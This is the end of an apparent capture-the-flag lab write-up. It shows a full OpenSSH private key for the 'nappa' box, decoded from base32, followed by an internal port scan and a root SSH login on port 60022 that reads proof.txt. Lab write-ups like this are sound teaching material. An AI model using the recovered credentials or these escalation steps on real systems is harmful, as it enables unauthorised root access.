cPWlQTcNn4pAqXsnD06RF41bVN6Jd8mFCZSwvGaOiUnPPqxUn5LVdh4WiONVNFGRqG+eJY                                                                                                                                             
3xNoLjhjDAf2T/ToOJ4ggy0NDQ3x9mW2wENIp36cGCEk1Xvx2pn2DxYNRsABkNwMxUowV9                                                                                                                                             
nY6pvUJmo1ELKP50CJXdzw9xDiYshwbYxMvh4xzjNuoDtWXQiNU3d8YH44bJmRtNJz8JBX                                                                                                                                             
HZnDOS9bt33DXEacNbXDnBHqAL6YyyGnOookYZnEs43wkt2NQh9nHq51+Q6ADv+xcGTy0g                                                                                                                                             
Ni5aztXnYyJZWjSF6YjxjdAxvkw0U/KnrJrpitGX85bp0qxzdFtx4QHVlYFYsMT93Ub/jd                                                                                                                                             
izVusvy5Nu+lKqI+HhQsuUv1Oj1XV75G94XLqA4VX7VPq8o0wGopUD00rgsjCfROZSTf6m                                                                                                                                             
ssZhZ0tn4RVAIoqJasPcIGFbE3N8EzJ7f3VCJUKDAAAFgIEOwwKBDsMCAAAAB3NzaC1yc2                                                                                                                                             
EAAAGBAJpHlr7+LjFOAJMsY/vs4BV673GOm8Z+RfbajtevIm9LGqURoo/1VXD1pUE3DZ+K                                                                                                                                             
QKl7Jw9OkReNW1TeiXfJhQmUsLxmjolJzz6sVJ+S1XYeFojjVTRRkahvniWN8TaC44YwwH                                                                                                                                             
9k/06DieIIMtDQ0N8fZltsBDSKd+nBghJNV78dqZ9g8WDUbAAZDcDMVKMFfZ2Oqb1CZqNR                                                                                                                                             
Cyj+dAiV3c8PcQ4mLIcG2MTL4eMc4zbqA7Vl0IjVN3fGB+OGyZkbTSc/CQVx2ZwzkvW7d9                                                                                                                                             
w1xGnDW1w5wR6gC+mMshpzqKJGGZxLON8JLdjUIfZx6udfkOgA7/sXBk8tIDYuWs7V52Mi                                                                                                                                             
WVo0hemI8Y3QMb5MNFPyp6ya6YrRl/OW6dKsc3RbceEB1ZWBWLDE/d1G/43Ys1brL8uTbv                                                                                                                                             
pSqiPh4ULLlL9To9V1e+RveFy6gOFV+1T6vKNMBqKVA9NK4LIwn0TmUk3+prLGYWdLZ+EV
QCKKiWrD3CBhWxNzfBMye391QiVCgwAAAAMBAAEAAAGAD5AXKc8UM88NicsZjuk3NZOAIf
Fjz2MfhaZIcINvMtDdsDcWMfVqmAl/kROPoT9eBHqy1v1y73BH/Uixj07Zx7yjE245BKpY
aJcTtkEmnVKtrUNZbfyod9hCmME3yurrLrcuQ+uZQX9NYmq3TY8y8r8FIUXFKtOpAwCNMX
Fx34qLeNNbpgvnlR7x3zf9dbBxGnqwrrHLDsB3IryAUflkNaX2HppFNZ3AMiHq+HEKjpiO
pTbPEW6IuOFWHGKVZYd2Wdil2+ZIoN7ZhUWvdMKghxJIOTEx0P0RAif7vj1W83xHvxVc9u
Ayzp49f2QEov+ZGUmfFRT78a2R39NLeDaAHMVnbn1ROz7pnUYJV7EKREVT8+/NlkzItZKx
PCgFwGsz4aQleCSTjaIi5ZLhIxnWuDPCjgbbIWnXGHb8CkSX5zHSfxGtkfSm9ZoXeS1lnn
rWvDYsx9vtq1vuUsChBLDqFwuuJBXhuySToaOQQMi7SqrigjQaoKYWY4eQxn9QX0zRAAAA
wGz/wO1b8Q4PFg857mV7qZ9WiRHxeoQAUN7RcSfbgpw+VBdUpKOjn4rdq4QiNpIepzaIk6
DYHdV0AVAsZzpukFPYUbfyXVVt+/R/CmWH4+/cajUpWNeD6l3ZoRJDWJ3w7vXR+4pbQcV+
GJawqW1Fc7f0uk+Y8hpue7XkryKm0QHLVJn44EpeL6I45uZRtNfpqteY0kHU1A2rfxIBf5
gG+yCEJiwdpEKlIzMnd8X8otdYg8/omulbDeJ2voZ+o7zbEwAAAMEAzSIcKqD7niW6NKwS
XKufsx+b5PIZ6ITZIXagKv6Pn06YRxCkOBKJdu5/Cr6Z7JMmKSA3ZuN8Pp6U1xoa3PC5J+
AKQJ9FcmTQk9Ln84jGSOkhj0OPHfa5Xa3EjK5qdwaP2iwNe4SXyXO9T7opA6MBoXO4RKac
/Doifw9qz1YZxzThn12/Zpxx8qryNqlsz70uj88XsEXAYnN2/I9/HlKp8p9HYspzYrcFYK
QIGxzX8uy2otSVoWV8GB9Q0ceLdCc7AAAAwQDAiUjXF8myBYt1J4gZgBpY5dZVQ73laU2v
iTLNiFX4CbI59p6OXilxYm/vtSyKVjrFlnla7UtOpi7Ylh3PWuz43gH3l/knZ3lf7DnjJO
/U6ux9JvetPMzp9qrf8kRL8RTMji2Lo3giYevgT4Lv3ASTQWE7DNahAYwV0FA4pwA5dQHq
V9ZfdORT8qDHX4FSEbY681mDB66nkrD5AoYO4XYYd67vy2C3KOXD9901llmM+f2aGp8UjI
HzfKMk8Wg27VkAAAAKcm9vdEBuYXBwYQE=
-----END OPENSSH PRIVATE KEY-----
[kathleen@nappa ~]$ base32 -d en > key
```

Now lets check for internal ports

```
[kathleen@nappa ~]$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
tcp   LISTEN 0      1024         0.0.0.0:8080       0.0.0.0:*    users:(("bundle",pid=296,fd=12))
tcp   LISTEN 0      32           0.0.0.0:21         0.0.0.0:*                                    
tcp   LISTEN 0      128          0.0.0.0:60022      0.0.0.0:*                                    
tcp   LISTEN 0      80                 *:3306             *:*                                    
tcp   LISTEN 0      511                *:28080            *:*                                    
tcp   LISTEN 0      128             [::]:60022         [::]:*                                    
[kathleen@nappa ~]$ 
```

The key is going to be for the root user since there's only one user on the box which is kathleen and we're currently her

There's no `nc` or `telnet` on the box lol so i'll have to manually try to connect to each port hoping one will be ssh

After few seconds i got the port which is `60022`

```
[kathleen@nappa ~]$ chmod 600 key 
[kathleen@nappa ~]$ ssh -i key root@localhost -p 60022
The authenticity of host '[localhost]:60022 ([127.0.0.1]:60022)' can't be established.
ECDSA key fingerprint is SHA256:fCoHtJfCUqjGijse/eAZYqHM4X/4H/15HIGbM/atqis.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:60022' (ECDSA) to the list of known hosts.
[root@nappa ~]# ls -al
total 24
drwxr-x---  5 root root 4096 Jan 24 00:59 .
drwxr-xr-x 17 root root 4096 Nov 10  2020 ..
-rw-------  1 root root    0 Nov 16  2020 .bash_history
drwxr-xr-x  3 root root 4096 Nov  6  2020 .bundle
drwxr-xr-x  4 root root 4096 Nov  4  2020 .gem
drwx------  2 root root 4096 Nov  6  2020 .ssh
-rw-------  1 root root   33 Jan 24 00:59 proof.txt
[root@nappa ~]# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>




